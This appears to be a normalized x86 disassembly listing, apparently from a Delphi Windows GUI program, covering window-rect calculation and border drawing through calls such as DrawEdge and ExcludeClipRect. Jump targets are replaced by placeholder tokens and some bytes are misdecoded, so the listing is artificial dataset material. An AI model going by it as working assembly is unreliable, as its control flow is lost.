mov [ esp + 0x14 ] eax
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov edx [ esp + 0x10 ]
mov [ esp + 0x8 ] edx
mov [ esp + 0x10 ] eax
sub_47a188
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x1d8 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x1d8 ]
mov edx [ esp + 0x4 ]
call sub_4305a0
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_4303e0
mov edx [ esp ]
mov eax ebx
mov si 0xffb2
call sub_40587c
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_47a1e8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_47a2de
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_40587c
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a2e5
mov eax [ ebp - 0x14 ]
call sub_4055f0
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_430608
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4305a0
mov edi eax
mov eax edi
mov si 0xffb6
call sub_40587c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1e8 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x34 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_47a2f4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x1 ] cl
mov ecx [ ebp + 0x8 ]
push ecx
xor cl 0x1
push ecx
movzx ecx [ ebp - 0x1 ]
call sub_47a1e8
mov edx eax
test edx edx
je r-xdata
pop ecx
pop ebp
retn 0x4
mov eax edx
mov edx [ eax ]
call [ edx + 0xe8 ]
sub_47a324
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_475884
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_475848
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_47a36c
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_479928
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4710ec
sub_47a3b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
mov eax [ esi + 0x70 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor ebx ebx
mov [ edx ] ebx
mov ebx [ esi + 0x70 ]
mov ebx [ ebx + 0x14 ]
mov [ edx ] ebx
jmp r-xdata
xor ebx ebx
mov [ ecx ] ebx
mov ebx [ esi + 0x70 ]
mov ebx [ ebx + 0x10 ]
mov [ ecx ] ebx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov ebx [ ebp + 0xc ]
xor edi edi
mov [ ebx ] edi
mov ebx [ esi + 0x70 ]
mov ebx [ ebx + 0xc ]
mov edi [ ebp + 0xc ]
mov [ edi ] ebx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax ] ebx
mov eax [ esi + 0x70 ]
mov eax [ eax + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov ebx [ esi + 0x74 ]
add eax [ ebx + 0x10 ]
cmp [ edx ] 0x0
jle r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
mov ebx [ ebp + 0xc ]
cmp eax [ ebx ]
jg r-xdata
add [ edx ] eax
mov eax [ esi + 0x74 ]
mov eax [ eax + 0xc ]
mov ebx [ esi + 0x74 ]
add eax [ ebx + 0x14 ]
cmp [ ecx ] 0x0
jle r-xdata
mov ebx [ ebp + 0xc ]
sub [ ebx ] eax
mov ebx [ ebp + 0x8 ]
cmp eax [ ebx ]
jg r-xdata
add [ ecx ] eax
mov ebx [ ebp + 0x8 ]
sub [ ebx ] eax
sub_47a478
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
mov eax esi
call sub_47a060
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_475884
test eax eax
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea edx [ ebp - 0x68 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xa0 ]
lea eax [ ebp - 0x68 ]
call sub_40ac5c
test al al
jne r-xdata
mov eax [ esi + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x68 ]
sub eax edx
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x5c ]
sub edx [ ebp - 0x64 ]
sub eax edx
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x68 ]
sub eax edx
mov [ ebp - 0x1c ] eax
mov eax [ esi + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x5c ]
sub edx [ ebp - 0x64 ]
sub eax edx
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
sub [ eax ] edx
xor eax eax
push ebp
push sub_47a8e9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
mov eax esi
call sub_475884
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
sub [ eax ] edx
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x24 ] 0x0
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x50 ]
lea edx [ ebp - 0x48 ]
mov eax ebx
call sub_47a3b4
movzx eax [ ebx + 0x5d ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
movzx eax [ ebx + 0x63 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x24 ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x34 ] 0x0
jle r-xdata
mov eax [ ebp - 0x30 ]
add eax [ ebp - 0x40 ]
mov edx [ ebp - 0x10 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x55 ] 0x0
jmp r-xdata
mov [ ebp - 0x55 ] 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov [ ebp - 0x55 ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_475848
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
add eax [ ebp - 0x40 ]
mov edx [ ebp - 0x10 ]
mov [ edx ] eax
movzx eax [ ebx + 0x5d ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x68 ]
sub edx eax
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x55 ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov eax [ ebp - 0x34 ]
add eax [ ebp - 0x44 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x34 ]
add eax [ ebp - 0x44 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
movzx eax [ ebx + 0x63 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x68 ]
add edx [ ebp - 0x4c ]
sub edx eax
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov [ ebp - 0x55 ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
mov [ ebp - 0x56 ] 0x0
jmp r-xdata
mov [ ebp - 0x56 ] 0x1
cmp [ ebp - 0x50 ] 0x0
jle r-xdata
mov [ ebp - 0x56 ] 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
add [ eax ] edx
movzx eax [ ebp - 0x55 ]
dec eax
sub al 0x2
jb r-xdata
cmp [ ebp - 0x54 ] 0x0
jle r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x5c ]
sub edx [ ebp - 0x64 ]
sub edx eax
sub edx [ ebp - 0x50 ]
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x56 ] 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
add [ eax ] edx
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x5c ]
sub edx [ ebp - 0x64 ]
add edx [ ebp - 0x54 ]
sub edx eax
mov [ ebp - 0x54 ] edx
jmp r-xdata
mov [ ebp - 0x56 ] 0x3
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x38 ] eax
mov eax [ ebx + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x3c ] eax
jmp r-xdata
movzx eax [ ebp - 0x56 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
cmp [ ebp - 0x50 ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x54 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
cmp eax [ ebp - 0x50 ]
jge r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x40 ] eax
mov eax [ ebx + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x44 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x54 ]
jle r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x50 ]
mov [ eax ] edx
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
cmp eax [ ebp - 0x30 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x54 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x34 ]
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
sub_47a901
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_47a478
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4721b0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_47a940
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4737c4
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_470690
cmp [ edi + 0x168 ] 0x0
jne r-xdata
sub_47a988
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4739c8
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x168 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_47a9b8
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_47a060
test al al
je r-xdata
movzx eax [ ebp - 0x11 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5d ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xa0 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x1ac ]
xor ecx ecx
push ebp
push sub_47aae2
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_475884
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_475884
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47aae9
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffffffef
mov eax [ ebp - 0x4 ]
call sub_47537c
retn
inc esi
mov [ ebp - 0x18 ] 0x0
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x5d ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x18 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_475848
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor edx edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
jmp r-xdata
mov ecx [ eax + 0x48 ]
push ecx
mov ecx [ eax + 0x4c ]
push ecx
mov ecx [ eax + 0x44 ]
sub ecx edx
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x98 ]
sub_47aae9
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x5d ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x5d ]
mov eax edx
sub al 0x3
jae r-xdata
movzx eax [ ebp - 0x11 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x68 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0x10 ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x68 ]
jmp r-xdata
sub_47ab7c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x1b8 ]
neg eax
push eax
mov edx [ ebx + 0x1b8 ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x1b1 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x1af ] 0x0
je r-xdata
cmp [ ebx + 0x1b0 ] 0x0
je r-xdata
mov edx [ ebx + 0x1b4 ]
add eax edx
mov esi edi
test [ ebx + 0x1ae ] 0x1
je r-xdata
mov edx [ ebx + 0x1b4 ]
add eax edx
test [ ebx + 0x1ae ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x1ae ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x1ae ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_47ac10
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_47aebb
push [ fs : ecx ]
mov [ fs : ecx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
push 0x0
call MapWindowPoints
mov ecx [ ebp - 0x28 ]
neg ecx
mov edx [ ebp - 0x2c ]
neg edx
lea eax [ ebp - 0x1c ]
call sub_40ac74
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b8 ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowLongW
mov ebx eax
test ebx 0x200000
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b8 ] 0x0
jbe r-xdata
test ebx 0x100000
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_487348
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b1 ] 0x0
je r-xdata
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax 0x1
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x1af ]
test dl dl
je r-xdata
call sub_485c78
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_4871c8
lea edx [ ebp - 0x1c ]
push edx
mov edx [ ebp - 0x8 ]
push eax
call GetRgnBox
push 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
push 0x0
call MapWindowPoints
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x2c ]
call sub_40abfc
mov ecx [ ebp - 0x38 ]
neg ecx
mov edx [ ebp - 0x3c ]
neg edx
lea eax [ ebp - 0x2c ]
call sub_40ac74
mov ecx [ ebp - 0x28 ]
neg ecx
mov edx [ ebp - 0x2c ]
neg edx
lea eax [ ebp - 0x2c ]
call sub_40ac74
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1b0 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c0 ]
call sub_44cd7c
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ReleaseDC
retn
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x1ae ] 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x1b4 ]
add esi ecx
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x1ae ] 0x2
je r-xdata
sub [ ebp - 0x2c ] esi
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x1ae ] 0x4
je r-xdata
sub [ ebp - 0x28 ] esi
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x1ae ] 0x8
je r-xdata
add [ ebp - 0x24 ] esi
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x1ae ]
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x1b1 ]
or ecx [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x1e9 ]
or ecx [ ebx * 4 + rw-data ]
or ecx 0x2000
push ecx
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
push edx
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
add [ ebp - 0x20 ] esi
sub_47aef8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax [ ebx + 0x1e0 ]
test eax eax
je r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x1e0 ]
call sub_4305a0
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x1e0 ]
call sub_4305a0
